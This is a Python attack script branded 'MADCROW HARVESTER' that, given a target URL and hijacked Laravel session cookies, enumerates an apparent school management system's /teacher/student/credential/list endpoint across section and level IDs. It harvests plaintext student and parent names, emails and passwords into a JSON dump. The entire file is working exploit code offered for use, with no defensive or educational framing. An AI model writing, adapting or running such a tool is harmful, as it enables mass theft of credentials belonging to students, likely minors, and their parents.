import asyncio
import aiohttp
import json
import sys
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def _build_banner():
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    RESET   = "\033[0m"

    crow = [
        "              ,        ,",
        "             /(        )`",
        "             \\ \\___   / |",
        "             /- _  `-/  '",
        "            (/\\/ \\ \\   /\\",
        "            / /   | `    \\",
        "            O O   ) /    |",
        "            `-^--'`<     '",
        "           (_.)  _  )   /",
        "            `.___/`    /",
        "             `-----' /",
        " <----.     __ / __   \\",
        " <----|====O)))==) \\) /====",
        " <----'    `--' `.__,' \\",
        "              |        |",
        "               \\       /",
        "          ______( (_  / \\______",
        "        ,'  ,-----'   |        \\",
        "        `--{__________)        \\/",
    ]

    madcrow = [
        "\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557    \u2588\u2588\u2557",
        "\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551    \u2588\u2588\u2551",
        "\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551",
        "\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551",
        "\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d",
        "\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d",
    ]

    harvester = [
        "\u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
        "\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
        "\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d",
        "\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
        "\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551",
        "\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d   \u255a\u2550\u255d   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d",
    ]

    
    T = max(len(l) for l in madcrow + harvester)

    colored_title = (
        [" " * T] * 3
        + [f"{CYAN}{l}{RESET}{' ' * (T - len(l))}" for l in madcrow]
        + [f"{YELLOW}{l}{RESET}{' ' * (T - len(l))}" for l in harvester]
        + [" " * T] * 4
    )

    lines = [""]
    for t, c in zip(colored_title, crow):
        lines.append(f"  {t}    {RED}{c}{RESET}")
    lines.append(f"\n {MAGENTA}credential harvester  //  developed by r00tk1t{RESET}\n")
    return "\n".join(lines)

BANNER = _build_banner()

print(BANNER)


try:
    BASE_URL        = input("\033[96m[?]\033[0m Target URL          : ").strip().rstrip("/")
    SESSION_COOKIE  = input("\033[96m[?]\033[0m laravel_session      : ").strip()
    XSRF_COOKIE     = input("\033[96m[?]\033[0m XSRF-TOKEN           : ").strip()
    SY_ID           = int(input("\033[96m[?]\033[0m SY ID (default 1)   : ").strip() or "1")
    MAX_CONCURRENT  = int(input("\033[96m[?]\033[0m Concurrency (default 100): ").strip() or "100")
    DEBUG           = input("\033[96m[?]\033[0m Debug mode    (y/N)      : ").strip().lower() == "y"
except KeyboardInterrupt:
    print("\n\033[93m[!]\033[0m Aborted.")
    raise SystemExit(0)

print()

credentials = []
seen_keys   = set()

CYAN  = "\033[96m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
DIM   = "\033[90m"
RESET = "\033[0m"

async def fetch(session, semaphore, lock, section_id, level_id):
    async with semaphore:
        params = {
            "sectionid": section_id, "syid": SY_ID, "levelid": level_id,
            "start": 0, "length": 500, "search[value]": ""
        }
        url = f"{BASE_URL}/teacher/student/credential/list"
        if DEBUG:
            qs = "&".join(f"{k}={v}" for k, v in params.items() if k not in ("start","length","search[value]"))
            tqdm.write(f"  {DIM}[>]{RESET} sec={section_id} lvl={level_id}  {DIM}{qs}{RESET}")
        try:
            async with session.get(url, params=params,
                                   timeout=aiohttp.ClientTimeout(total=5)) as r:
                if DEBUG:
                    tqdm.write(f"  {DIM}[<]{RESET} {CYAN}{r.status}{RESET}  sec={section_id} lvl={level_id}")
                if r.status != 200:
                    return
                data = await r.json(content_type=None)
                records = data.get("data", []) if isinstance(data, dict) else []
                if DEBUG:
                    tqdm.write(f"  {DIM}[=]{RESET} {len(records)} student(s)  sec={section_id} lvl={level_id}")
                for student in records:
                    for cred in student.get("student_credentials", []) + student.get("parent_credentials", []):
                        if cred.get("passwordstr"):
                            entry = {
                                "name":     student.get("student"),
                                "email":    cred.get("email"),
                                "password": cred["passwordstr"]
                            }
                            key = (entry["name"], entry["email"])
                            async with lock:
                                if key not in seen_keys:
                                    seen_keys.add(key)
                                    credentials.append(entry)
                                    tqdm.write(f"  {GREEN}[+]{RESET} {entry['name']} | {entry['email']} | {entry['password']}")
        except Exception as e:
            if DEBUG:
                tqdm.write(f"  {YELLOW}[!]{RESET} sec={section_id} lvl={level_id}  {DIM}{e}{RESET}")

async def main():
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    lock = asyncio.Lock()
    cookies = {"laravel_session": SESSION_COOKIE, "XSRF-TOKEN": XSRF_COOKIE}

    pairs = [
        (section_id, level_id)
        for section_id in range(1, 100)
        for level_id in range(1, 50)
    ]

    async with aiohttp.ClientSession(cookies=cookies) as session:
        pbar = tqdm(total=len(pairs), desc="Harvesting", colour="cyan", unit="req")

        async def run(section_id, level_id):
            await fetch(session, semaphore, lock, section_id, level_id)
            pbar.update(1)
            pbar.set_postfix(found=len(credentials))

        tasks = [asyncio.create_task(run(s, l)) for s, l in pairs]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            pbar.close()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("\n\033[93m[!]\033[0m Interrupted — saving partial results...")

unique = list({(c["name"], c["email"]): c for c in credentials}.values())

with open("dumps/credentials_dump.json", "w") as f:
    json.dump(unique, f, indent=2)

print(f"\n\033[96m[*]\033[0m Total credentials harvested: \033[93m{len(unique)}\033[0m unique")
